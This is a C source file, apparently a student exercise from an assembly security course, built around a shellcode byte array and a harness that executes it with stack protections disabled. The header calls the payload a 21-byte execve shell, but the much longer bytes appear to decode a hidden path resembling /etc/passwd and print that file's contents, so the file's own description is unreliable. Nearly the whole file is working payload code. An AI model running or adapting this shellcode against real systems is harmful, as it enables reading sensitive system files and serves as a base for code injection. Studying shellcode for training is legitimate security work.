/*
Filename:      shellcode-orig.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Source:        http://shell-storm.org/shellcode/files/shellcode-841.php
Information:   Linux/x86 - tiny_execve_sh_shellcode - 21 bytes
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode-orig.c -o shellcode-orig
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x0f\x6f\x04\x24\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x0f\x6f\x0c\x24\x68\x01\x01\x01\x01\x0f\x6f\x14\x24\x0f\xfd\xc2\x0f\xfd\xca\x0f\x7f\x04\x24\x0f\x7f\x0c\x24\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
